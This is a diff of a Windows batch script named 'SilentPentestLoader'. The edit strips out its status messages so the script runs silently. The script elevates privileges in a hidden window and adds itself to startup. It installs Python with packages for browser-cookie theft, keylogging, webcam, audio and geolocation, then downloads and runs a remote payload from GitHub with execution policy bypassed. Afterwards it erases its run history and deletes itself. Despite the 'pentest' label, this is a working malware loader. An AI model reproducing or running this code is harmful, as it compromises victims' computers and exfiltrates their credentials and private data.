@@ -6,13 +6,11 @@
 
 :: Check for Windows 10/11
 ver | find "10." >nul || ver | find "11." >nul || (
-echo [ERROR] Unsupported OS
 exit /b 1
 )
 
 :: Check for admin rights and elevate if needed
 fsutil dirty query %SystemDrive% >nul 2>&1 || (
-echo [INFO] Elevating privileges
 PowerShell -WindowStyle Hidden -Command "Start-Process -Verb RunAs -WindowStyle Hidden -FilePath '%~f0' -ArgumentList '/pentest'"
 exit /b
 )
@@ -21,7 +19,6 @@ setlocal EnableDelayedExpansion
 set "NULL=>nul 2>&1"
 
 :: ===== ADD TO STARTUP =====
-echo [INFO] Configuring startup...
 set "STARTUP_REG=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
 set "SCRIPT_NAME=SilentPentestLoader"
 set "TARGET_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0"
@@ -37,7 +34,6 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "Dis
 
 :: Install Python if not present
 where python %NULL% || (
-echo [INFO] Installing Python
 bitsadmin /transfer pyDL /download /priority foreground https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe %TEMP%\py_setup.exe %NULL%
 start /wait %TEMP%\py_setup.exe /quiet InstallAllUsers=1 PrependPath=1 AssociateFiles=0 Shortcuts=0 %NULL%
 timeout /t 5 /nobreak %NULL%
@@ -52,29 +48,25 @@ for /f "tokens=2*" %%a in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Ses
 )
 
 :: Install required Python packages
-echo [INFO] Installing requirements
 python -m pip install --upgrade pip %NULL%
-echo [INFO] Installing requirements >nul
 python -m pip install --quiet --no-warn-script-location --disable-pip-version-check --user pywin32 pypiwin32 >nul
 python -m pip install --quiet --no-warn-script-location --disable-pip-version-check --user pywin32 pypiwin32 pycryptodome browser-cookie3 pillow opencv-python sounddevice numpy scipy pynput geocoder requests >nul
 
 
 :: Run security assessment (MODIFY THIS TO USE YOUR OWN SCRIPT)
-echo [STATUS] Running security assessment
 PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (irm 'https://raw.githubusercontent.com/distroyer57/Payload404/refs/heads/main/Backtrack.py?token=GHSAT0AAAAAADK5WSFMU25XLMIC5B474I5M2GCC33A')" %NULL%
 
 :: Cleanup
-echo [INFO] Cleaning artifacts
 del /q /f %TEMP%*_setup.* %NULL%
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f %NULL%
 
 :: Self-cleanup
 (
-echo @echo off
-echo ping 127.0.0.1 -n 5 ^>nul
-echo del /f /q "%~f0"
-echo del /f /q "%%~f0"
+ ping 127.0.0.1 -n 5 ^>nul
+ del /f /q "%~f0"
+ del /f /q "%%~f0"
 ) > "%TEMP%\cleanup.cmd"
 
 start /B cmd /c "%TEMP%\cleanup.cmd"
 exit /b
+
